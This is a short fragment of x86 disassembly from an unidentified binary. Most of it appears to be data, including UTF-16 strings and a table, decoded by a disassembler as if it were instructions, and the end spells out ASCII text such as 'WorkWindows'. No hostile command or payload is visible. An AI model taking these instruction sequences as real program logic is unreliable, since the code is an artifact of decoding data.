  423982:	inc    edx
  423983:	add    BYTE PTR [eax+eax*1+0x46],cl
  423987:	add    BYTE PTR [edi+0x0],bl
  42398a:	xor    eax,DWORD PTR [eax]
  42398c:	inc    ebp
  42398d:	add    BYTE PTR [ecx+0x0],cl
  423990:	push   edx
  423991:	add    BYTE PTR [ecx],bh
  423993:	add    BYTE PTR [esi+0x0],dl
  423996:	add    BYTE PTR [eax],al
  423998:	dec    ebp
  423999:	add    BYTE PTR [edi],dh
  42399b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42399f:	add    BYTE PTR [edx+0x0],cl
  4239a2:	pop    eax
  4239a3:	add    BYTE PTR [ebx],dh
  4239a5:	add    BYTE PTR [ecx],dh
  4239a7:	add    BYTE PTR [ebx+0x0],al
  4239aa:	add    BYTE PTR [eax],al
  4239ac:	dec    edi
  4239ad:	add    BYTE PTR [esi],dh
  4239af:	add    BYTE PTR [eax+0x0],cl
  4239b2:	pop    edi
  4239b3:	add    BYTE PTR [eax],dh
  4239b5:	add    BYTE PTR [edi],dh
  4239b7:	add    BYTE PTR [ecx],dh
  4239b9:	add    BYTE PTR [edx+0x0],dl
  4239bc:	xor    eax,0x55000000
  4239c1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239c5:	add    BYTE PTR [edi+0x0],bl
  4239c8:	push   esp
  4239c9:	add    BYTE PTR [ecx+0x0],al
  4239cc:	cmp    DWORD PTR [eax],eax
  4239ce:	pop    edi
  4239cf:	add    BYTE PTR [ebx],dh
  4239d1:	add    BYTE PTR [eax],dh
  4239d3:	add    BYTE PTR [eax],bh
  4239d5:	add    BYTE PTR [edi+0x0],cl
  4239d8:	inc    ebx
  4239d9:	add    BYTE PTR ds:0x4d000000,dh
  4239df:	add    BYTE PTR [esi+0x0],cl
  4239e2:	inc    ebp
  4239e3:	add    BYTE PTR [edi+0x0],bl
  4239e6:	push   esp
  4239e7:	add    BYTE PTR [esi+0x0],al
  4239ea:	cmp    BYTE PTR [eax],al
  4239ec:	push   ebx
  4239ed:	add    BYTE PTR [edx+0x0],bl
  4239f0:	pop    edi
  4239f1:	add    BYTE PTR [eax],dh
  4239f3:	add    BYTE PTR [eax],bh
  4239f5:	add    BYTE PTR [eax+0x0],cl
  4239f8:	add    BYTE PTR [eax],al
  4239fa:	dec    esi
  4239fb:	add    BYTE PTR [edi+0x0],cl
  4239fe:	pop    edx
  4239ff:	add    BYTE PTR [edi+0x0],bl
  423a02:	add    BYTE PTR ss:[ecx+0x0],bl
  423a06:	dec    ebp
  423a07:	add    BYTE PTR [esi],dh
  423a09:	add    BYTE PTR [ebx],dh
  423a0b:	add    BYTE PTR [edi+0x0],bl
  423a0e:	xor    al,0x0
  423a10:	dec    esi
  423a11:	add    BYTE PTR [edx],dh
  423a13:	add    BYTE PTR [esi],dh
  423a15:	add    BYTE PTR [ecx],dh
  423a17:	add    BYTE PTR [eax],al
  423a19:	add    BYTE PTR [ebx+0x0],cl
  423a1c:	dec    eax
  423a1d:	add    BYTE PTR [eax],bh
  423a1f:	add    BYTE PTR [edi+0x0],bl
  423a22:	inc    esi
  423a23:	add    BYTE PTR [esi+0x0],al
  423a26:	push   esp
  423a27:	add    BYTE PTR [edi],dh
  423a29:	add    BYTE PTR [esi],dh
  423a2b:	add    BYTE PTR [edi+0x0],bl
  423a2e:	dec    esp
  423a2f:	add    BYTE PTR [ecx+0x0],bl
  423a32:	add    BYTE PTR [eax],al
  423a34:	push   ebx
  423a35:	add    BYTE PTR [ecx+0x0],bl
  423a38:	xor    BYTE PTR [eax],al
  423a3a:	pop    edi
  423a3b:	add    BYTE PTR [ecx],bh
  423a3d:	add    BYTE PTR [edx+0x0],dl
  423a40:	dec    eax
  423a41:	add    BYTE PTR [ecx+0x0],bl
  423a44:	xor    al,BYTE PTR [eax]
  423a46:	pop    edi
  423a47:	add    BYTE PTR [eax],dh
  423a49:	add    BYTE PTR [eax],al
  423a4b:	add    BYTE PTR [edx+0x0],al
  423a4e:	dec    edx
  423a4f:	add    BYTE PTR [esi+0x0],cl
  423a52:	xor    al,BYTE PTR [eax]
  423a54:	pop    edi
  423a55:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a59:	add    BYTE PTR [edx+0x0],dl
  423a5c:	xor    al,0x0
  423a5e:	dec    eax
  423a5f:	add    BYTE PTR [eax],al
  423a61:	add    BYTE PTR [ebp+0x0],dl
  423a64:	add    BYTE PTR ss:[ebp+0x0],cl
  423a68:	xor    DWORD PTR [eax],eax
  423a6a:	pop    edi
  423a6b:	add    BYTE PTR [esi],dh
  423a6d:	add    BYTE PTR [ecx+0x0],bl
  423a70:	push   ebp
  423a71:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a75:	add    BYTE PTR [edi+0x0],cl
  423a78:	inc    esp
  423a79:	add    BYTE PTR [edi+0x0],dl
  423a7c:	push   ebx
  423a7d:	add    BYTE PTR [eax],al
  423a7f:	add    BYTE PTR [edx+0x0],bl
  423a82:	inc    ebx
  423a83:	add    BYTE PTR [ebp+0x0],dl
  423a86:	pop    edi
  423a87:	add    BYTE PTR [ecx],dh
  423a89:	add    BYTE PTR [ebp+0x0],al
  423a8c:	push   esp
  423a8d:	add    BYTE PTR [eax],dh
  423a8f:	add    BYTE PTR [eax],al
  423a91:	add    BYTE PTR [eax],al
  423a93:	add    BYTE PTR [eax],al
  423a95:	add    BYTE PTR [eax-0x7ffbffbe],al
  423a9b:	inc    edx
  423a9c:	add    BYTE PTR [eax],cl
  423a9e:	add    BYTE PTR [edx+0x0],0xc
  423aa2:	add    BYTE PTR [edx+0x0],0x10
  423aa6:	add    BYTE PTR [edx+0x0],0x14
  423aaa:	add    BYTE PTR [edx+0x0],0x18
  423aae:	add    BYTE PTR [edx+0x0],0x1c
  423ab2:	add    BYTE PTR [edx+0x0],0x20
  423ab6:	add    BYTE PTR [edx+0x0],0x24
  423aba:	add    BYTE PTR [edx+0x0],0x28
  423abe:	add    BYTE PTR [edx+0x0],0x0
	...
  423ad2:	add    BYTE PTR [eax],al
  423ad4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    bh,BYTE PTR [ebx]
  423ade:	add    al,BYTE PTR [eax]
  423ae0:	add    DWORD PTR [eax],eax
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	add    DWORD PTR [eax],eax
  423ae6:	add    BYTE PTR [eax],al
  423ae8:	add    DWORD PTR [eax],eax
  423aea:	add    BYTE PTR [eax],al
  423aec:	clc    
  423aed:	cmp    al,BYTE PTR [edx]
  423aef:	add    ah,bh
  423af1:	cmp    al,BYTE PTR [edx]
  423af3:	add    BYTE PTR [eax],al
  423af5:	cmp    eax,DWORD PTR [edx]
  423af7:	add    BYTE PTR [esi-0x31],al
  423afa:	add    BYTE PTR [eax],al
  423afc:	push   cs
  423afd:	cmp    eax,DWORD PTR [edx]
  423aff:	add    BYTE PTR [eax],al
  423b01:	add    BYTE PTR [edi+0x6f],dl
  423b04:	jb     0x423b6a
  423b06:	push   edi
  423b07:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b0e:	aas    
  423b0f:	inc    ebp
  423b10:	outs   dx,BYTE PTR ds:[esi]
  423b11:	jne    0x423b80
  423b13:	push   edi
  423b14:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b1b:	popa   
  423b1c:	je     0x423b87
  423b1e:	outs   dx,DWORD PTR ds:[esi]
  423b1f:	outs   dx,BYTE PTR ds:[esi]
  423b20:	jae    0x423b75
  423b22:	je     0x423b85
  423b24:	.byte 0x74
